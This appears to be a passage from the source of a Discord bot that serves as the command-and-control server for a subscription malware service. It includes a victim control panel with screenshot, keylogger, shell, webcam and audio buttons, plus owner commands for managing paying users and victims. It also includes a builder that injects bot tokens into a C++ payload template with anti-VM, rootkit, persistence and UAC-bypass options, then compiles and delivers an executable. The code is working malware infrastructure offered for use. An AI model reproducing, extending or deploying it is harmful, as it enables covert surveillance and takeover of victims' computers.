                            .setCustomId(`c2_files_${victim.hardware_id}`)
                            .setLabel('📁 Files')
                            .setStyle(ButtonStyle.Primary),
                        new ButtonBuilder()
                            .setCustomId(`c2_keylog_${victim.hardware_id}`)
                            .setLabel('⌨️ Keylogger')
                            .setStyle(ButtonStyle.Primary)
                    );

                const row2 = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`c2_shell_${victim.hardware_id}`)
                            .setLabel('🖥️ Shell')
                            .setStyle(ButtonStyle.Success),
                        new ButtonBuilder()
                            .setCustomId(`c2_webcam_${victim.hardware_id}`)
                            .setLabel('📷 Webcam')
                            .setStyle(ButtonStyle.Success),
                        new ButtonBuilder()
                            .setCustomId(`c2_audio_${victim.hardware_id}`)
                            .setLabel('🎤 Audio')
                            .setStyle(ButtonStyle.Success),
                        new ButtonBuilder()
                            .setCustomId(`c2_disconnect_${victim.hardware_id}`)
                            .setLabel('🔌 Disconnect')
                            .setStyle(ButtonStyle.Danger)
                    );

                message.reply({ embeds: [controlEmbed], components: [row1, row2] });

            } catch (error) {
                console.error('Control command error:', error);
                message.reply('❌ An error occurred.');
            }
        }
        // -------------------------------------
        // Admin Command (!admin) - Owner: 1454132213011579155
        // -------------------------------------
        else if (command === '!admin') {
            if (message.author.id !== '1454132213011579155') return;
            const subCommand = args.shift();

            if (subCommand === 'listusers') {
                const users = await db.all('SELECT username, plan, plan_expiry, discord_id FROM users');
                const embed = new EmbedBuilder()
                    .setTitle('👥 User Management')
                    .setColor('#FFFF00');

                if (users.length === 0) {
                    embed.setDescription('No users found.');
                } else {
                    const list = users.map(u => {
                        const expiry = u.plan_expiry ? new Date(u.plan_expiry).toLocaleDateString() : 'Lifetime';
                        const bound = u.discord_id ? '✅ Bound' : '⚠️ Unbound';
                        return `**${u.username}** \nPlan: \`${u.plan}\` | Exp: ${expiry} | ${bound}`;
                    }).join('\n\n');
                    embed.setDescription(list);
                }

                message.reply({ embeds: [embed] });

            } else if (subCommand === 'deleteuser') {
                const target = args[0];
                if (!target) return message.reply('Usage: `!admin deleteuser <username>`');
                await db.run('DELETE FROM users WHERE username = ?', target);
                message.reply(`✅ Deleted user **${target}**.`);

            } else if (subCommand === 'updateplan') {
                const [target, newPlan] = args;
                if (!target || !newPlan) return message.reply('Usage: `!admin updateplan <username> <plan>`');
                await db.run('UPDATE users SET plan = ? WHERE username = ?', [newPlan.toLowerCase(), target]);
                message.reply(`✅ Updated **${target}** plan to **${newPlan}**.`);

            } else if (subCommand === 'setexpiry') {
                const [target, durationStr] = args;
                if (!target || !durationStr) return message.reply('Usage: `!admin setexpiry <username> <duration>`\nExamples: `30d`, `lifetime`');

                try {
                    const expiryDate = parseDuration(durationStr);
                    await db.run('UPDATE users SET plan_expiry = ? WHERE username = ?', [expiryDate, target]);

                    const expiryText = expiryDate ? new Date(expiryDate).toLocaleDateString() : 'Lifetime';
                    message.reply(`✅ Updated **${target}** expiry to **${expiryText}**.`);
                } catch (e) { message.reply('❌ Invalid format.'); }

            } else if (subCommand === 'clearvictims') {
                // Wipe all victims
                try {
                    await db.run('DELETE FROM victims');
                    // Also clear command queue to avoid phantom commands
                    await db.run('DELETE FROM command_queue');
                    message.reply('✅ **All victims have been disconnected and wiped from the database.**\nNext check-in will be treated as a New Victim.');
                    console.log('[ADMIN] Victims table cleared by owner.');
                } catch (e) {
                    message.reply(`❌ Error clearing victims: ${e.message}`);
                }

            } else if (subCommand === 'deletevictim') {
                const targetHWID = args[0];
                if (!targetHWID) return message.reply('Usage: `!admin deletevictim <HWID>`');

                try {
                    const result = await db.run('DELETE FROM victims WHERE hardware_id = ?', targetHWID);
                    if (result.changes > 0) {
                        message.reply(`✅ Victim **${targetHWID}** deleted.`);
                    } else {
                        message.reply(`⚠️ Victim **${targetHWID}** not found.`);
                    }
                } catch (e) {
                    message.reply(`❌ Error: ${e.message}`);
                }

            } else {
                message.reply({
                    embeds: [new EmbedBuilder()
                        .setTitle('🛡️ Admin Help')
                        .setDescription('Available Commands:')
                        .addFields(
                            { name: '!admin listusers', value: 'List all users' },
                            { name: '!admin deleteuser <user>', value: 'Delete a user' },
                            { name: '!admin updateplan <user> <plan>', value: 'Change plan' },
                            { name: '!admin setexpiry <user> <time>', value: 'Set expiry' },
                            { name: '!announce_all', value: 'Broadcast welcome message to ALL' }
                        )
                    ]
                });
            }
        }
    });

    // -------------------------------------
    // Button Interaction Handler for C2 Control Panel & Builder
    // -------------------------------------
    client.on('interactionCreate', async interaction => {
        if (!interaction.isButton()) return;

        const customId = interaction.customId;

        // ===== BUILD CONFIGURATION BUTTONS =====
        if (customId.startsWith('build_')) {
            const parts = customId.split('_');
            const action = parts[1]; // toggle, confirm, cancel

            //userId is always the last part for build_ action
            const userId = parts[parts.length - 1];
            const feature = action === 'toggle' ? parts[2] : null;

            // Verify it's the right user
            if (userId !== interaction.user.id) {
                return interaction.reply({ content: '❌ This builder is not for you.', ephemeral: true });
            }

            try {
                if (action === 'cancel') {
                    buildConfigs.delete(userId);
                    await interaction.update({ content: '❌ **Build cancelled.**', embeds: [], components: [] });
                    return;
                }

                if (action === 'toggle') {
                    // Initialize config if doesn't exist
                    if (!buildConfigs.has(userId)) {
                        buildConfigs.set(userId, {
                            antivm: false,
                            crypt: false,
                            startup: false,
                            hook: false,
                            socket: false,
                            rootkit: false,
                            persistence: false,
                            uac: false
                        });
                    }

                    const config = buildConfigs.get(userId);
                    config[feature] = !config[feature];

                    // Update embed to show selected features
                    const selectedFeatures = Object.keys(config).filter(k => config[k]);
                    const featureNames = {
                        antivm: '🛡️ Anti-VM',
                        crypt: '🔒 Encryption',
                        startup: '👻 Hidden Startup',
                        hook: '🎭 Process Hook',
                        socket: '📡 Hidden Socket',
                        rootkit: '💀 RootKit',
                        persistence: '🔄 Persistence',
                        uac: '🔓 UAC Bypass'
                    };

                    const selectedText = selectedFeatures.length > 0
                        ? selectedFeatures.map(f => featureNames[f]).join(', ')
                        : '`None selected`';

                    // Get user plan for rootkit check
                    const user = await db.get('SELECT * FROM users WHERE discord_id = ?', userId);
                    const userPlan = user.plan.toLowerCase();
                    const hasRootkit = ['diamond', 'professional'].includes(userPlan);

                    // Update embed
                    const embed = interaction.message.embeds[0];
                    embed.fields[1].value = selectedText;

                    // Update button styles
                    const row1 = new ActionRowBuilder()
                        .addComponents(
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_antivm_${userId}`)
                                .setLabel('🛡️ Anti-VM')
                                .setStyle(config.antivm ? ButtonStyle.Success : ButtonStyle.Secondary),
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_crypt_${userId}`)
                                .setLabel('🔒 Encryption')
                                .setStyle(config.crypt ? ButtonStyle.Success : ButtonStyle.Secondary),
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_startup_${userId}`)
                                .setLabel('👻 Hidden Startup')
                                .setStyle(config.startup ? ButtonStyle.Success : ButtonStyle.Secondary),
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_hook_${userId}`)
                                .setLabel('🎭 Process Hook')
                                .setStyle(config.hook ? ButtonStyle.Success : ButtonStyle.Secondary)
                        );

                    const row2 = new ActionRowBuilder()
                        .addComponents(
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_socket_${userId}`)
                                .setLabel('📡 Hidden Socket')
                                .setStyle(config.socket ? ButtonStyle.Success : ButtonStyle.Secondary),
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_rootkit_${userId}`)
                                .setLabel('💀 RootKit')
                                .setStyle(config.rootkit ? ButtonStyle.Success : (hasRootkit ? ButtonStyle.Secondary : ButtonStyle.Danger))
                                .setDisabled(!hasRootkit),
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_persistence_${userId}`)
                                .setLabel('🔄 Persistence')
                                .setStyle(config.persistence ? ButtonStyle.Success : ButtonStyle.Secondary),
                            new ButtonBuilder()
                                .setCustomId(`build_toggle_uac_${userId}`)
                                .setLabel('🔓 UAC Bypass')
                                .setStyle(config.uac ? ButtonStyle.Success : ButtonStyle.Secondary)
                        );

                    const row3 = new ActionRowBuilder()
                        .addComponents(
                            new ButtonBuilder()
                                .setCustomId(`build_confirm_${userId}`)
                                .setLabel('✅ Build Payload')
                                .setStyle(ButtonStyle.Success),
                            new ButtonBuilder()
                                .setCustomId(`build_cancel_${userId}`)
                                .setLabel('❌ Cancel')
                                .setStyle(ButtonStyle.Danger)
                        );

                    await interaction.update({ embeds: [embed], components: [row1, row2, row3] });
                    return;
                }

                if (action === 'confirm') {
                    const config = buildConfigs.get(userId) || {};
                    const user = await db.get('SELECT * FROM users WHERE discord_id = ?', userId);
                    if (!user) return interaction.reply({ content: '❌ User not found.', ephemeral: true });

                    const latestKey = await db.get('SELECT key_string FROM key_usage WHERE user_id = ? ORDER BY generated_at DESC LIMIT 1', user.id);
                    if (!latestKey) return interaction.reply({ content: '❌ No key found.', ephemeral: true });

                    // Show building status
                    const buildingEmbed = new EmbedBuilder()
                        .setColor('#ffaa00')
                        .setTitle('🔨 Building Payload...')
                        .setDescription('Please wait while your customized payload is being compiled.')
                        .addFields(
                            { name: '⚙️ Features Enabled', value: Object.keys(config).filter(k => config[k]).length > 0 ? Object.keys(config).filter(k => config[k]).map(k => `\`${k}\``).join(', ') : '`Basic`', inline: false },
                            { name: '📊 Status', value: '⏳ Generating source code...', inline: false }
                        )
                        .setTimestamp();

                    await interaction.update({ embeds: [buildingEmbed], components: [] });

                    try {
                        const fs = require('fs');
                        const path = require('path');
                        const { exec } = require('child_process');
                        const util = require('util');
                        const execPromise = util.promisify(exec);

                        const buildDir = path.join(process.cwd(), 'temp_build');
                        if (!fs.existsSync(buildDir)) fs.mkdirSync(buildDir);

                        const sourceFile = path.join(buildDir, `payload_${userId}.cpp`);
                        const outputFile = path.join(buildDir, `NrjmWitch_${userId}.exe`);

                        // Read payload template
                        let sourceCode = fs.readFileSync(path.join(__dirname, 'temp_build', 'payload.cpp'), 'utf8');

                        // Secure Token Injection
                        sourceCode = sourceCode.replace('{{LICENSE_KEY}}', latestKey.key_string);
                        sourceCode = sourceCode.replace('{{BOT_TOKEN}}', process.env.DISCORD_TOKEN);
                        sourceCode = sourceCode.replace('{{CHANNEL_ID}}', '1471566542302089226'); // Hardcoded or env config

                        // Feature Flags
                        let defines = '';
                        if (config.antivm) defines += '#define USE_ANTIVM\n'; // Keep antivm as it was in the original config
                        if (config.startup) defines += '#define USE_STARTUP\n';
                        if (config.crypt) defines += '#define USE_CRYPT\n';
                        if (config.hook) defines += '#define USE_HOOK\n';
                        if (config.socket) defines += '#define USE_SOCKET\n';
                        if (config.rootkit) defines += '#define USE_ROOTKIT\n';
                        if (config.persistence) defines += '#define USE_PERSISTENCE\n';
                        if (config.uac) defines += '#define USE_UAC\n';

                        // Prepend defines to source
                        sourceCode = defines + "\n" + sourceCode;

                        // Write personalized source file
                        fs.writeFileSync(sourceFile, sourceCode);

                        // 2. Compile
                        buildingEmbed.setFields(
                            { name: '⚙️ Features Enabled', value: Object.keys(config).filter(k => config[k]).length > 0 ? Object.keys(config).filter(k => config[k]).map(k => `\`${k}\``).join(', ') : '`Basic`', inline: false },
                            { name: '📊 Status', value: '⏳ Compiling... (this may take a few seconds)', inline: false }
                        );
                        await interaction.editReply({ embeds: [buildingEmbed] });

                        const gppPath = '"C:\\msys64\\ucrt64\\bin\\g++.exe"';
                        const compileCmd = `${gppPath} -o "${outputFile}" "${sourceFile}" -I "C:\\msys64\\ucrt64\\include" -L "C:\\msys64\\ucrt64\\lib" -lwininet -lws2_32 -mwindows -static -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -O2 -s`;

                        const compileEnv = {
                            ...process.env,
                            PATH: `C:\\msys64\\ucrt64\\bin;${process.env.PATH}`
                        };

                        await execPromise(compileCmd, { env: compileEnv });

                        // 3. Success
                        const successEmbed = new EmbedBuilder()
                            .setColor('#00ff00')
                            .setTitle('✅ Payload Built Successfully!')
                            .setDescription('Your customized payload is ready for deployment.')
                            .addFields(
                                { name: '🛠️ Features', value: Object.keys(config).filter(k => config[k]).map(k => `\`${k}\``).join(', ') || '`Basic`', inline: false },
                                { name: '📁 File', value: '`NrjmWitch_Payload.exe`', inline: true },
                                { name: '💾 Size', value: `${(fs.statSync(outputFile).size / 1024).toFixed(1)} KB`, inline: true }
                            )
                            .setFooter({ text: 'Deploy responsibly and legally' })
                            .setTimestamp();

                        await interaction.editReply({
                            embeds: [successEmbed],
                            files: [{ attachment: outputFile, name: 'NrjmWitch_Payload.exe' }]
                        });

                        // Cleanup
                        buildConfigs.delete(userId);
                        // fs.unlinkSync(sourceFile); // Keep for debugging if needed
                        // fs.unlinkSync(outputFile);

                    } catch (err) {
                        console.error('[Builder] Compilation Error:', err);
                        const errorEmbed = new EmbedBuilder()
                            .setColor('#ff0000')
                            .setTitle('❌ Compilation Failed')
                            .setDescription('Failed to compile your custom payload. Please ensure the server has the required tools.')
                            .addFields({ name: 'Error Log', value: `\`\`\`${err.message.substring(0, 1000)}\`\`\`` })
                            .setTimestamp();
                        await interaction.editReply({ embeds: [errorEmbed] });
                    }

                    return;
                }

            } catch (error) {
                console.error('[Builder] Button error:', error);
                await interaction.reply({ content: '❌ An error occurred.', ephemeral: true });
            }
            return;
        }

        // ===== C2 CONTROL BUTTONS =====
        // Check if it's a C2 control button
        if (!customId.startsWith('c2_')) return;

        const [, action, hwid] = customId.split('_');

        try {
            // Get victim info
            const victim = await db.get('SELECT * FROM victims WHERE hardware_id = ?', hwid);
            if (!victim) {
                return interaction.reply({ content: '❌ Victim not found or disconnected.', ephemeral: true });
            }

            // Verify user owns this victim
            const user = await db.get('SELECT * FROM users WHERE discord_id = ?', interaction.user.id);
            if (!user || victim.user_id !== user.id) {
                return interaction.reply({ content: '❌ Unauthorized access.', ephemeral: true });
            }

            // Handle different actions
            switch (action) {
                case 'screenshot':
                    // Queue screenshot command
                    await db.run(`
                        INSERT INTO command_queue (victim_hwid, command_type, command_data, status, created_at)
                        VALUES (?, 'screenshot', NULL, 'pending', ?)
                    `, [hwid, new Date().toISOString()]);

                    await interaction.reply({
                        content: '📸 **Screenshot requested!**\nCommand queued. The victim will execute it on next check-in.\n\n⏳ Waiting for response...',
                        ephemeral: true
                    });
                    break;

                case 'sysinfo':
                    const sysEmbed = new EmbedBuilder()
                        .setColor('#0099ff')
                        .setTitle('💻 System Information')
                        .addFields(
                            { name: 'Computer Name', value: `\`${victim.computer_name}\``, inline: true },
                            { name: 'IP Address', value: `\`${victim.ip_address}\``, inline: true },
                            { name: 'OS', value: `\`${victim.os_info}\``, inline: true },
                            { name: 'Hardware ID', value: `\`${victim.hardware_id}\``, inline: false },
                            { name: 'Status', value: victim.status === 'online' ? '🟢 Online' : '⚫ Offline', inline: true },
                            { name: 'Last Seen', value: `<t:${Math.floor(new Date(victim.last_seen).getTime() / 1000)}:R>`, inline: true }
                        );
                    await interaction.reply({ embeds: [sysEmbed], ephemeral: true });
                    break;

                case 'files':
                    await interaction.reply({ content: '📁 **File Manager**\nThis feature is under development.', ephemeral: true });
                    break;

                case 'keylog':
                    await interaction.reply({ content: '⌨️ **Keylogger**\nThis feature is under development.', ephemeral: true });
                    break;

                case 'shell':
                    await interaction.reply({ content: '🖥️ **Remote Shell**\nThis feature is under development.', ephemeral: true });
                    break;

                case 'disconnect':
                    await db.run('UPDATE victims SET status = ? WHERE hardware_id = ?', ['offline', hwid]);
                    await interaction.reply({ content: '🔌 **Victim marked as disconnected.**', ephemeral: true });
                    break;

                default:
                    await interaction.reply({ content: '❌ Unknown action.', ephemeral: true });
            }

        } catch (error) {
            console.error('[C2] Button interaction error:', error);
            await interaction.reply({ content: '❌ An error occurred.', ephemeral: true });
        }
    });

    client.login(process.env.TOKEN);
}

startBot();
